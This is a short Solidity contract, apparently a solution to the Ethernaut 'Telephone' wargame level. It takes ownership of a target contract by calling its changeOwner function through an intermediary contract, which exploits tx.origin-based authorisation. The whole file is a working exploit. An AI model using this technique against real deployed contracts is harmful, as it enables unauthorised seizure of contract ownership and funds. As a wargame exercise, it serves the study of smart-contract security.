//SPDX-License-Identifier:MIT
pragma solidity ^0.6.0;

import "./Telephone.sol";

contract N4Attacker {
    address public owner;
    Telephone public victim;

    constructor(address _victim) public {
        owner = msg.sender;
        victim = Telephone(_victim);
    }

    function attack() public {
        victim.changeOwner(owner);
    }
}